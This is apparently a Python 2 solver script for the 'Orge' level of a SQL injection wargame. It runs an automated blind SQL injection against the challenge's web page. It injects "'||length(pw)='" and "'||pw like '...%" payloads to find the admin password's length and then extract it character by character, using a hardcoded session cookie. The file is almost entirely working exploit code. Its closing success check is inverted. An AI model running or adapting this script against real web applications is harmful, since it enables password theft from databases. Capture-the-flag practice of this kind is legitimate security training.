#-*- coidng: utf-8 -*-
#Los / 07. Orge

import urllib2

result = '' # I will save key to this var
url = "http://los.eagle-jump.org/orge_40d2b61f694f72448be9c97d1cea2480.php?pw={}" # url. we can insert data into {} by using format()
length = 0

def getContent(value, purpose):
	req = urllib2.Request(url.format(value))

	req.add_header('User-Agent', "Mozila/5.0")  # Browser info
	req.add_header('Cookie', 'PHPSESSID=uvjnp5kaltqk6o7q6v629hbqp4')  # PHP SESSION ID
	req.add_header('__cfduid', 'd94c5132db81e12788364d9a966964cd31507633746')

	content = urllib2.urlopen(req).read()

	if content.find(purpose) != -1:
		return True

for i in range(1,1000):
	print i
	if getContent("'||length(pw)='" + str(i), "Hello admin"): # guest pw length = 15 & admin pw length = 8
		length = i
		print "length is", length
		break

for i in range(0, length):
	for j in range(32,127): # 표시 가능한 구역
		if j == 37:
			continue
		print result + chr(j)
		if getContent("'||pw like '" + result + chr(j) + '%25', "Hello admin"):
			result += chr(j)
			print "find key ::", i, j, "::", result
			break

if len(result) == length:
	print "Failed.."
	exit(0)

print "success", result.lower()

# Result 6c864dec